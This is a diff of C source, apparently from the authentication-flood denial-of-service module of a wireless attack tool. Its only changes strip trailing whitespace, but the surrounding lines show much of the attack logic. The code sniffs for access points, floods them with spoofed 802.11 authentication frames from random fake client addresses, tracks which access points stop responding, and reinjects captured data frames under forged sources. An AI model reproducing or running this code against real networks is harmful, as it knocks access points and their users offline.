@@ -75,12 +75,12 @@ void auth_dos_longhelp()
 void *auth_dos_parse(int argc, char *argv[]) {
   int opt;
   struct auth_dos_options *aopt = malloc(sizeof(struct auth_dos_options));
-  
+
   aopt->target = NULL;
   aopt->valid_mac = 0;
   aopt->intelligent = 0;
   aopt->speed = 0;
-  
+
   while ((opt = getopt(argc, argv, "a:mi:s:")) != -1) {
     switch (opt) {
       case 'a':
@@ -106,7 +106,7 @@ void *auth_dos_parse(int argc, char *argv[]) {
 	return NULL;
     }
   }
-  
+
   return (void *) aopt;
 }
 
@@ -117,17 +117,17 @@ void auth_dos_sniffer(void *target) {
   struct ether_addr *bssid, *dup;
   struct clistauthdos *curap;
   static struct ether_addr dupdetect;
-  
+
   if (target) aps = add_to_clistauthdos(aps, *((struct ether_addr *) target), AUTH_DOS_STATUS_NEW, 0, 0);
-  
+
   while(1) {
     sniffed = osdep_read_packet();
     if (sniffed.len == 0) exit(-1);
-    
+
     dup = get_destination(&sniffed);
     if (MAC_MATCHES(dupdetect, *dup)) continue;  //Duplicate ignored
     MAC_COPY(dupdetect, *dup);
-    
+
     //Check for APs in status UP and missing over 500!
     if (aps) {
       curap = aps;
@@ -139,11 +139,11 @@ void auth_dos_sniffer(void *target) {
 	curap = curap->next;
       } while (curap != aps);
     }
-    
+
     hdr = (struct ieee_hdr *) sniffed.data;
     bssid = get_bssid(&sniffed);
     curap = search_ap(aps, *bssid);
-    
+
     if (! target) {	//We don't care about other APs when there is a fixed target
       if (hdr->type == IEEE80211_TYPE_BEACON) {
 	if (! curap) { //New AP!
@@ -153,10 +153,10 @@ void auth_dos_sniffer(void *target) {
 	}
       }
     }
-    
+
     if ((hdr->type == IEEE80211_TYPE_AUTH) && curap) {
       struct auth_fixed *authpack = (struct auth_fixed *) (sniffed.data + sizeof(struct ieee_hdr));
-      
+
       if (authpack->seq == htole16((uint16_t) 2)) {
 	if (authpack->status == 0) {
 	  curap->responses++;
@@ -193,18 +193,18 @@ void auth_dos_intelligent_sniffer(void *target) {
   struct ether_addr *src, *dest, *bssid, *target_ap = (struct ether_addr *) target;
   struct ieee_hdr *hdr;
   struct auth_fixed *af;
-  
+
   while (1) {
     pkt = osdep_read_packet();
     if (pkt.len == 0) exit(-1);
-    
+
     bssid = get_bssid(&pkt);
     dest = get_destination(&pkt);
-    
+
     if (! MAC_MATCHES(*bssid, *target_ap)) continue;	// skip packets from other sources
 
     hdr = (struct ieee_hdr *) pkt.data;
-    
+
     switch (hdr->type) {
 
       case IEEE80211_TYPE_AUTH:
@@ -279,7 +279,7 @@ void auth_dos_intelligent_sniffer(void *target) {
 	      size_warning = 1;
 	    }
 	  }
-	  
+
 
 	default:
 	    // Not interesting, count something???
@@ -293,12 +293,12 @@ struct ether_addr auth_dos_get_target() {
   char frozen_only = 1;
   unsigned int apnr, i;
   static unsigned int select_any = 0;
-  
+
   while (aps == NULL) {
     printf("\rWaiting for targets...               \n");
     sleep(1);
   }
-  
+
   start = aps;
   do {
     if (start->status != AUTH_DOS_STATUS_FROZEN) {
@@ -307,7 +307,7 @@ struct ether_addr auth_dos_get_target() {
     }
     start = start->next;
   } while (start != aps);
-  
+
   if (frozen_only) {
     //printf("\rAll APs in range seem to be frozen, selecting one of them nonetheless.\n"); //Too much blah blah
     apnr = random() % apcount;
@@ -316,7 +316,7 @@ struct ether_addr auth_dos_get_target() {
     increment_here = start;
     return start->ap;
   }
-  
+
   select_any++;
   apnr = random() % apcount;
   start = aps;
@@ -331,10 +331,10 @@ struct packet auth_dos_get_data(struct ether_addr client, struct ether_addr bssi
   struct packet retn;
   struct ether_addr *dst, *src, *bss;
   struct ieee_hdr *hdr;
-    
+
   //NOTE: ToDS frames are being reinjected with the source address of one of the fake nodes
   //      FromDS frames are being rebroadcastet by setting ToDS flag + Broadcast destination
-    
+
   //Skip some packets for variety
   dataclist = dataclist->next;
   dataclist = dataclist->next;
@@ -342,9 +342,9 @@ struct packet auth_dos_get_data(struct ether_addr client, struct ether_addr bssi
   //Copy packet out of the list
   memcpy(retn.data, dataclist->data, dataclist->data_len);
   retn.len = dataclist->data_len;
-  
+
   hdr = (struct ieee_hdr *) retn.data;
-  
+
   if (hdr->flags | 0x01) { //ToDS set -> reinject with fake source
     src = get_source(&retn);
     *src = client;
@@ -371,13 +371,13 @@ struct packet auth_dos_intelligent_getpacket(struct auth_dos_options *aopt) {
   struct packet beacon, pkt;
   struct ieee_hdr *hdr;
   static uint16_t capabilities;
-  
+
   if (! cl) {
     // Building first fake client to initialize list
     if (aopt->valid_mac) fmac = generate_mac(MAC_KIND_CLIENT);
       else fmac = generate_mac(MAC_KIND_RANDOM);
     cl = add_to_clistauthdos(cl, fmac, AUTH_DOS_STATUS_NEW, 0, 0);
-    
+
     // Setting up statistics counters
     ia_stats.c_authed = 0;
     ia_stats.c_assoced = 0;
@@ -475,14 +475,14 @@ struct packet auth_dos_getpacket(void *options) {
   struct packet pkt;
   static unsigned int nb_sent = 0;
   static time_t t_prev = 0;
-  
+
   if (aopt->intelligent) return auth_dos_intelligent_getpacket(aopt);
 
   if (! sniffer) {
     sniffer = malloc(sizeof(pthread_t));
     pthread_create(sniffer, NULL, (void *) auth_dos_sniffer, (void *) aopt->target);
   }
-  
+
   if (! aopt->target) {
      if ((nb_sent % 1024 == 0) || ((time(NULL) - t_prev) >= 5)) {
        t_prev = time(NULL);
@@ -496,9 +496,9 @@ struct packet auth_dos_getpacket(void *options) {
 
   if (aopt->valid_mac) client = generate_mac(MAC_KIND_CLIENT);
   else client = generate_mac(MAC_KIND_RANDOM);
-  
+
   pkt = create_auth(bssid, client, 1);
-  
+
   if (aopt->speed) sleep_till_next_packet(aopt->speed);
 
   nb_sent++;
@@ -509,7 +509,7 @@ struct packet auth_dos_getpacket(void *options) {
 
 void auth_dos_print_stats(void *options) {
   struct auth_dos_options *aopt = (struct auth_dos_options *) options;
-  
+
   if(aopt->intelligent) {
     printf("\rClients: Created: %4d   Authenticated: %4d   Associated: %4d   Denied: %4d   Got Kicked: %4d\n",
 	    ia_stats.c_created, ia_stats.c_authed, ia_stats.c_assoced, ia_stats.c_denied, ia_stats.c_kicked);
